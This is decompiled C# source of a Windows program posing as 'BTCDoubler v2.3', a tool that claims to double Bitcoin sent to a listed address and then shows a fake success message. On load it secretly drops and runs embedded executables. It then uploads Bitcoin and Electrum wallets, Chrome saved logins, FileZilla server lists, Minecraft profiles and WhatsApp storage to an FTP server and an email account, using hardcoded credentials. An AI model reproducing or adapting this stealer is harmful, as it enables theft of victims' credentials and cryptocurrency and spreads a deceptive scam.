using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using BTCDoubler_v2._3.My;
using BTCDoubler_v2._3.My.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace BTCDoubler_v2._3;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("label6")]
	private Label _label6;

	[AccessedThroughProperty("label7")]
	private Label _label7;

	[AccessedThroughProperty("label5")]
	private Label _label5;

	[AccessedThroughProperty("maskedTextBox2")]
	private MaskedTextBox _maskedTextBox2;

	[AccessedThroughProperty("label4")]
	private Label _label4;

	[AccessedThroughProperty("maskedTextBox1")]
	private MaskedTextBox _maskedTextBox1;

	[AccessedThroughProperty("button1")]
	private Button _button1;

	[AccessedThroughProperty("label1")]
	private Label _label1;

	[AccessedThroughProperty("pictureBox1")]
	private PictureBox _pictureBox1;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("ProgressBar1")]
	private ProgressBar _ProgressBar1;

	[AccessedThroughProperty("Button3")]
	private Button _Button3;

	[AccessedThroughProperty("Button2")]
	private Button _Button2;

	[AccessedThroughProperty("Button4")]
	private Button _Button4;

	private string appData;

	private string appDataLocal;

	private WebClient webclient1;

	private virtual Label label6
	{
		get
		{
			return _label6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_label6 = value;
		}
	}

	private virtual Label label7
	{
		get
		{
			return _label7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_label7 = value;
		}
	}

	private virtual Label label5
	{
		get
		{
			return _label5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_label5 = value;
		}
	}

	private virtual MaskedTextBox maskedTextBox2
	{
		get
		{
			return _maskedTextBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_maskedTextBox2 = value;
		}
	}

	private virtual Label label4
	{
		get
		{
			return _label4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_label4 = value;
		}
	}

	private virtual MaskedTextBox maskedTextBox1
	{
		get
		{
			return _maskedTextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_maskedTextBox1 = value;
		}
	}

	private virtual Button button1
	{
		get
		{
			return _button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = button1_Click;
			if (_button1 != null)
			{
				((Control)_button1).remove_Click(eventHandler);
			}
			_button1 = value;
			if (_button1 != null)
			{
				((Control)_button1).add_Click(eventHandler);
			}
		}
	}

	private virtual Label label1
	{
		get
		{
			return _label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = label1_Click;
			if (_label1 != null)
			{
				((Control)_label1).remove_Click(eventHandler);
			}
			_label1 = value;
			if (_label1 != null)
			{
				((Control)_label1).add_Click(eventHandler);
			}
		}
	}

	private virtual PictureBox pictureBox1
	{
		get
		{
			return _pictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = pictureBox1_Click;
			if (_pictureBox1 != null)
			{
				((Control)_pictureBox1).remove_Click(eventHandler);
			}
			_pictureBox1 = value;
			if (_pictureBox1 != null)
			{
				((Control)_pictureBox1).add_Click(eventHandler);
			}
		}
	}

	internal virtual Timer Timer1
	{
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual ProgressBar ProgressBar1
	{
		get
		{
			return _ProgressBar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ProgressBar1 = value;
		}
	}

	internal virtual Button Button3
	{
		get
		{
			return _Button3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Button3_Click;
			if (_Button3 != null)
			{
				((Control)_Button3).remove_Click(eventHandler);
			}
			_Button3 = value;
			if (_Button3 != null)
			{
				((Control)_Button3).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button2
	{
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Button2_Click;
			if (_Button2 != null)
			{
				((Control)_Button2).remove_Click(eventHandler);
			}
			_Button2 = value;
			if (_Button2 != null)
			{
				((Control)_Button2).add_Click(eventHandler);
			}
		}
	}

	private virtual Button Button4
	{
		get
		{
			return _Button4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Button4_Click;
			if (_Button4 != null)
			{
				((Control)_Button4).remove_Click(eventHandler);
			}
			_Button4 = value;
			if (_Button4 != null)
			{
				((Control)_Button4).add_Click(eventHandler);
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		appDataLocal = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
		webclient1 = new WebClient();
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f5: Expected O, but got Unknown
		//IL_0183: Unknown result type (might be due to invalid IL or missing references)
		//IL_018d: Expected O, but got Unknown
		//IL_020e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0218: Expected O, but got Unknown
		//IL_0309: Unknown result type (might be due to invalid IL or missing references)
		//IL_0313: Expected O, but got Unknown
		//IL_03e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ef: Expected O, but got Unknown
		//IL_0478: Unknown result type (might be due to invalid IL or missing references)
		//IL_0482: Expected O, but got Unknown
		//IL_0502: Unknown result type (might be due to invalid IL or missing references)
		//IL_050c: Expected O, but got Unknown
		//IL_06a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_06ae: Expected O, but got Unknown
		//IL_0844: Unknown result type (might be due to invalid IL or missing references)
		//IL_084e: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		label6 = new Label();
		label7 = new Label();
		label5 = new Label();
		maskedTextBox2 = new MaskedTextBox();
		label4 = new Label();
		maskedTextBox1 = new MaskedTextBox();
		button1 = new Button();
		label1 = new Label();
		pictureBox1 = new PictureBox();
		Timer1 = new Timer(components);
		ProgressBar1 = new ProgressBar();
		Button3 = new Button();
		Button2 = new Button();
		Button4 = new Button();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		label6.set_AutoSize(true);
		((Control)label6).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label6).set_ForeColor(Color.Black);
		Label obj = label6;
		Point location = new Point(420, 213);
		((Control)obj).set_Location(location);
		((Control)label6).set_Name("label6");
		Label obj2 = label6;
		Size size = new Size(40, 13);
		((Control)obj2).set_Size(size);
		((Control)label6).set_TabIndex(41);
		label6.set_Text("(Copy!)");
		label7.set_AutoSize(true);
		((Control)label7).set_Font(new Font("Microsoft Sans Serif", 20.25f));
		Label obj3 = label7;
		location = new Point(50, 268);
		((Control)obj3).set_Location(location);
		((Control)label7).set_Name("label7");
		Label obj4 = label7;
		size = new Size(363, 31);
		((Control)obj4).set_Size(size);
		((Control)label7).set_TabIndex(39);
		label7.set_Text("Click after one Coinfirmation:");
		label5.set_AutoSize(true);
		((Control)label5).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_ForeColor(Color.Black);
		Label obj5 = label5;
		location = new Point(1, 168);
		((Control)obj5).set_Location(location);
		((Control)label5).set_Name("label5");
		Label obj6 = label5;
		size = new Size(209, 13);
		((Control)obj6).set_Size(size);
		((Control)label5).set_TabIndex(38);
		label5.set_Text("The Coins you want to double go 2:");
		MaskedTextBox obj7 = maskedTextBox2;
		location = new Point(4, 190);
		((Control)obj7).set_Location(location);
		((Control)maskedTextBox2).set_Name("maskedTextBox2");
		MaskedTextBox obj8 = maskedTextBox2;
		size = new Size(456, 20);
		((Control)obj8).set_Size(size);
		((Control)maskedTextBox2).set_TabIndex(37);
		maskedTextBox2.set_Text("12iGugxGfn259Nea4KELhd14gwkxuxATK5");
		label4.set_AutoSize(true);
		((Control)label4).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_ForeColor(Color.Black);
		Label obj9 = label4;
		location = new Point(1, 223);
		((Control)obj9).set_Location(location);
		((Control)label4).set_Name("label4");
		Label obj10 = label4;
		size = new Size(121, 13);
		((Control)obj10).set_Size(size);
		((Control)label4).set_TabIndex(36);
		label4.set_Text("The Transaction-ID:");
		MaskedTextBox obj11 = maskedTextBox1;
		location = new Point(4, 245);
		((Control)obj11).set_Location(location);
		((Control)maskedTextBox1).set_Name("maskedTextBox1");
		MaskedTextBox obj12 = maskedTextBox1;
		size = new Size(456, 20);
		((Control)obj12).set_Size(size);
		((Control)maskedTextBox1).set_TabIndex(35);
		((Control)button1).set_Font(new Font("Microsoft Sans Serif", 26.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		Button obj13 = button1;
		location = new Point(4, 302);
		((Control)obj13).set_Location(location);
		((Control)button1).set_Name("button1");
		Button obj14 = button1;
		size = new Size(456, 49);
		((Control)obj14).set_Size(size);
		((Control)button1).set_TabIndex(34);
		((ButtonBase)button1).set_Text("Send Coins!");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		label1.set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 40.25f));
		((Control)label1).set_ForeColor(SystemColors.ControlText);
		Label obj15 = label1;
		location = new Point(17, 105);
		((Control)obj15).set_Location(location);
		((Control)label1).set_Name("label1");
		Label obj16 = label1;
		size = new Size(441, 63);
		((Control)obj16).set_Size(size);
		((Control)label1).set_TabIndex(33);
		label1.set_Text("BTCDoubler v2.3");
		pictureBox1.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		PictureBox obj17 = pictureBox1;
		location = new Point(180, 2);
		((Control)obj17).set_Location(location);
		((Control)pictureBox1).set_Name("pictureBox1");
		PictureBox obj18 = pictureBox1;
		size = new Size(637, 544);
		((Control)obj18).set_Size(size);
		pictureBox1.set_TabIndex(32);
		pictureBox1.set_TabStop(false);
		ProgressBar progressBar = ProgressBar1;
		location = new Point(4, 376);
		((Control)progressBar).set_Location(location);
		((Control)ProgressBar1).set_Name("ProgressBar1");
		ProgressBar progressBar2 = ProgressBar1;
		size = new Size(456, 17);
		((Control)progressBar2).set_Size(size);
		((Control)ProgressBar1).set_TabIndex(42);
		Button button = Button3;
		location = new Point(366, 2);
		((Control)button).set_Location(location);
		((Control)Button3).set_Name("Button3");
		Button button2 = Button3;
		size = new Size(47, 31);
		((Control)button2).set_Size(size);
		((Control)Button3).set_TabIndex(44);
		((ButtonBase)Button3).set_Text("Close");
		((ButtonBase)Button3).set_UseVisualStyleBackColor(true);
		Button button3 = Button2;
		location = new Point(413, 2);
		((Control)button3).set_Location(location);
		((Control)Button2).set_Name("Button2");
		Button button4 = Button2;
		size = new Size(47, 31);
		((Control)button4).set_Size(size);
		((Control)Button2).set_TabIndex(45);
		((ButtonBase)Button2).set_Text("Help");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(true);
		((Control)Button4).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Button button5 = Button4;
		location = new Point(4, 352);
		((Control)button5).set_Location(location);
		((Control)Button4).set_Name("Button4");
		Button button6 = Button4;
		size = new Size(456, 22);
		((Control)button6).set_Size(size);
		((Control)Button4).set_TabIndex(46);
		((ButtonBase)Button4).set_Text("Reset");
		((ButtonBase)Button4).set_UseVisualStyleBackColor(true);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(463, 395);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)Button4);
		((Control)this).get_Controls().Add((Control)(object)Button2);
		((Control)this).get_Controls().Add((Control)(object)Button3);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar1);
		((Control)this).get_Controls().Add((Control)(object)label6);
		((Control)this).get_Controls().Add((Control)(object)label7);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)maskedTextBox2);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)maskedTextBox1);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("BTCDoubler v2.3");
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		int try0000_dispatch = -1;
		int num = default(int);
		WebClient webClient = default(WebClient);
		int num2 = default(int);
		int num3 = default(int);
		SmtpClient smtpClient = default(SmtpClient);
		string text = default(string);
		string password = default(string);
		string text2 = default(string);
		string text3 = default(string);
		string text4 = default(string);
		MailMessage mailMessage = default(MailMessage);
		string addresses = default(string);
		string subject = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					num = 1;
					webClient = new WebClient();
					goto IL_000a;
				case 1683:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0023;
						case 4:
							goto IL_0059;
						case 5:
							goto IL_0080;
						case 6:
							goto IL_009d;
						case 7:
							goto IL_00bf;
						case 8:
							goto IL_0118;
						case 9:
							goto IL_012d;
						case 10:
							goto IL_014d;
						case 11:
							goto IL_0158;
						case 12:
							goto IL_0163;
						case 13:
							goto IL_016e;
						case 14:
							goto IL_0179;
						case 15:
							goto IL_0190;
						case 16:
							goto IL_01a2;
						case 17:
							goto IL_01b4;
						case 18:
							goto IL_01c0;
						case 19:
							goto IL_01ef;
						case 20:
							goto IL_01f7;
						case 21:
							goto IL_0212;
						case 22:
							goto IL_0237;
						case 23:
						case 24:
							goto IL_0275;
						case 25:
							goto IL_0290;
						case 26:
							goto IL_02b5;
						case 27:
						case 28:
							goto IL_02f3;
						case 29:
							goto IL_030e;
						case 30:
							goto IL_0333;
						case 31:
						case 32:
							goto IL_0371;
						case 33:
							goto IL_038c;
						case 34:
							goto IL_03b1;
						case 35:
						case 36:
							goto IL_03ef;
						case 37:
							goto IL_0400;
						case 38:
							goto IL_0437;
						case 39:
						case 40:
							goto IL_045f;
						case 41:
							goto IL_047a;
						case 42:
							goto IL_049f;
						case 43:
						case 44:
							goto IL_04dd;
						case 45:
							goto IL_04f8;
						case 46:
							goto IL_051d;
						case 47:
						case 48:
							goto IL_055b;
						case 49:
							goto IL_056b;
						case 50:
							goto IL_057b;
						case 51:
							goto IL_0587;
						case 52:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 53:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0587:
					num = 51;
					smtpClient.Credentials = new NetworkCredential(text, password);
					break;
					IL_000a:
					num = 2;
					webClient.Credentials = new NetworkCredential("mulasystem", "Ufbiggesthsaliveyoa!!2");
					goto IL_0023;
					IL_0023:
					num = 3;
					((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllBytes(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\reader.exe", Resources.reader, false);
					goto IL_0059;
					IL_0059:
					num = 4;
					Process.Start(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\reader.exe");
					goto IL_0080;
					IL_0080:
					num = 5;
					text2 = DateAndTime.get_DateString() + ", " + Conversions.ToString(DateAndTime.get_TimeOfDay());
					goto IL_009d;
					IL_009d:
					num = 6;
					_ = "_" + DateAndTime.get_DateString() + "_" + Conversions.ToString(DateAndTime.get_TimeOfDay());
					goto IL_00bf;
					IL_00bf:
					num = 7;
					_ = "_" + DateAndTime.get_DateString() + "_" + Conversions.ToString(DateAndTime.get_TimeOfDay()) + "_" + webclient1.DownloadString("http://bot.whatismyipaddress.com/");
					goto IL_0118;
					IL_0118:
					num = 8;
					text3 = webclient1.DownloadString("http://bot.whatismyipaddress.com/");
					goto IL_012d;
					IL_012d:
					num = 9;
					text4 = "_" + webclient1.DownloadString("http://bot.whatismyipaddress.com/");
					goto IL_014d;
					IL_014d:
					num = 10;
					mailMessage = new MailMessage();
					goto IL_0158;
					IL_0158:
					num = 11;
					text = "gangundzoo@gmx.de";
					goto IL_0163;
					IL_0163:
					num = 12;
					addresses = "jeremykingswins@gmail.com";
					goto IL_016e;
					IL_016e:
					num = 13;
					password = "Kfbiggesthsaliveyoa!!2";
					goto IL_0179;
					IL_0179:
					num = 14;
					subject = "Fresh Data-Files: " + text2 + " | " + text3;
					goto IL_0190;
					IL_0190:
					num = 15;
					mailMessage.From = new MailAddress(text);
					goto IL_01a2;
					IL_01a2:
					num = 16;
					mailMessage.To.Add(addresses);
					goto IL_01b4;
					IL_01b4:
					num = 17;
					mailMessage.Subject = subject;
					goto IL_01c0;
					IL_01c0:
					num = 18;
					mailMessage.Body = "IP & mehr : \r\n" + webclient1.DownloadString("http://ip-api.com/json") + " / " + Dns.GetHostName();
					goto IL_01ef;
					IL_01ef:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_01f7;
					IL_01f7:
					num = 20;
					if (File.Exists(appData + "\\bitcoin\\wallet.dat"))
					{
						goto IL_0212;
					}
					goto IL_0275;
					IL_0212:
					num = 21;
					mailMessage.Attachments.Add(new Attachment(appData + "\\bitcoin\\wallet.dat"));
					goto IL_0237;
					IL_0237:
					num = 22;
					((ServerComputer)MyProject.Computer).get_Network().UploadFile(appData + "\\bitcoin\\wallet.dat", "ftp://mulasystem.bplaced.net/Geldleben/BitcoinWallet/wallet" + text4 + ".dat", "mulasystem", "Ufbiggesthsaliveyoa!!2");
					goto IL_0275;
					IL_0275:
					num = 24;
					if (File.Exists(appData + "\\Electrum\\wallets\\default_wallet."))
					{
						goto IL_0290;
					}
					goto IL_02f3;
					IL_0290:
					num = 25;
					mailMessage.Attachments.Add(new Attachment(appData + "\\Electrum\\wallets\\default_wallet."));
					goto IL_02b5;
					IL_02b5:
					num = 26;
					((ServerComputer)MyProject.Computer).get_Network().UploadFile(appData + "\\Electrum\\wallets\\default_wallet.", "ftp://mulasystem.bplaced.net/Geldleben/Electrum/default_wallet" + text4 + ".", "mulasystem", "Ufbiggesthsaliveyoa!!2");
					goto IL_02f3;
					IL_02f3:
					num = 28;
					if (File.Exists(appData + "\\.minecraft\\launcher_profiles.json"))
					{
						goto IL_030e;
					}
					goto IL_0371;
					IL_030e:
					num = 29;
					mailMessage.Attachments.Add(new Attachment(appData + "\\.minecraft\\launcher_profiles.json"));
					goto IL_0333;
					IL_0333:
					num = 30;
					((ServerComputer)MyProject.Computer).get_Network().UploadFile(appData + "\\.minecraft\\launcher_profiles.json", "ftp://mulasystem.bplaced.net/Geldleben/Minecraft/launcher_profiles" + text4 + ".json", "mulasystem", "Ufbiggesthsaliveyoa!!2");
					goto IL_0371;
					IL_0371:
					num = 32;
					if (File.Exists(appData + "\\FileZilla\\recentservers.xml"))
					{
						goto IL_038c;
					}
					goto IL_03ef;
					IL_038c:
					num = 33;
					mailMessage.Attachments.Add(new Attachment(appData + "\\FileZilla\\recentservers.xml"));
					goto IL_03b1;
					IL_03b1:
					num = 34;
					((ServerComputer)MyProject.Computer).get_Network().UploadFile(appData + "\\FileZilla\\recentservers.xml", "ftp://mulasystem.bplaced.net/Geldleben/FileZilla/recentservers" + text4 + ".xml", "mulasystem", "Ufbiggesthsaliveyoa!!2");
					goto IL_03ef;
					IL_03ef:
					num = 36;
					if (DoesProcessExists("chrome"))
					{
						goto IL_0400;
					}
					goto IL_045f;
					IL_0400:
					num = 37;
					((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllBytes(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\crprcss.exe", Resources.crprcss, false);
					goto IL_0437;
					IL_0437:
					num = 38;
					Process.Start(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp() + "\\crprcss.exe");
					goto IL_045f;
					IL_045f:
					num = 40;
					if (File.Exists(appDataLocal + "\\Google\\Chrome\\User Data\\Default\\Login Data."))
					{
						goto IL_047a;
					}
					goto IL_04dd;
					IL_047a:
					num = 41;
					mailMessage.Attachments.Add(new Attachment(appDataLocal + "\\Google\\Chrome\\User Data\\Default\\Login Data."));
					goto IL_049f;
					IL_049f:
					num = 42;
					((ServerComputer)MyProject.Computer).get_Network().UploadFile(appDataLocal + "\\Google\\Chrome\\User Data\\Default\\Login Data.", "ftp://mulasystem.bplaced.net/Geldleben/Chrome/Login Data" + text4 + ".", "mulasystem", "Ufbiggesthsaliveyoa!!2");
					goto IL_04dd;
					IL_04dd:
					num = 44;
					if (File.Exists(appData + "\\WhatsApp\\Local Storage\\file__0.localstorage"))
					{
						goto IL_04f8;
					}
					goto IL_055b;
					IL_04f8:
					num = 45;
					mailMessage.Attachments.Add(new Attachment(appData + "\\WhatsApp\\Local Storage\\file__0.localstorage"));
					goto IL_051d;
					IL_051d:
					num = 46;
					((ServerComputer)MyProject.Computer).get_Network().UploadFile(appData + "\\WhatsApp\\Local Storage\\file__0.localstorage", "ftp://mulasystem.bplaced.net/Geldleben/WhatsApp/file__0" + text4 + ".localstorage", "mulasystem", "Ufbiggesthsaliveyoa!!2");
					goto IL_055b;
					IL_055b:
					num = 48;
					smtpClient = new SmtpClient("mail.gmx.net");
					goto IL_056b;
					IL_056b:
					num = 49;
					smtpClient.Port = 587;
					goto IL_057b;
					IL_057b:
					num = 50;
					smtpClient.EnableSsl = true;
					goto IL_0587;
					end_IL_0000_2:
					break;
				}
				num = 52;
				smtpClient.Send(mailMessage);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 1683;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.CompareString(maskedTextBox1.get_Text(), "", false) == 0)
		{
			Interaction.MsgBox((object)"Please fill in your Transaction-ID.", (MsgBoxStyle)64, (object)"Hack failed");
		}
		else
		{
			Timer1.Start();
		}
	}

	private void pictureBox1_Click(object sender, EventArgs e)
	{
	}

	private void label1_Click(object sender, EventArgs e)
	{
	}

	private bool DoesProcessExists(string PName)
	{
		if (Process.GetProcessesByName(PName).Length > 0)
		{
			return true;
		}
		return false;
	}

	private void Button3_Click(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		Interaction.MsgBox((object)"If nothing happens theres no confirmation of the transaction.", (MsgBoxStyle)64, (object)"Help");
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		int try0000_dispatch = -1;
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					num = 1;
					ProgressBar1.Increment(1);
					goto IL_000e;
				case 126:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000e;
						case 3:
							goto IL_0015;
						case 4:
							goto IL_002f;
						case 5:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 6:
						case 7:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_002f:
					num = 4;
					Timer1.Stop();
					break;
					IL_000e:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0015;
					IL_0015:
					num = 3;
					if (ProgressBar1.get_Value() != ProgressBar1.get_Maximum())
					{
						goto end_IL_0000_3;
					}
					goto IL_002f;
					end_IL_0000_2:
					break;
				}
				num = 5;
				Interaction.MsgBox((object)"The coins have been successfully sent to your wallet!", (MsgBoxStyle)64, (object)"Successful!");
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 126;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void Button4_Click(object sender, EventArgs e)
	{
		ProgressBar1.set_Value(0);
		((TextBoxBase)maskedTextBox1).Clear();
	}
}
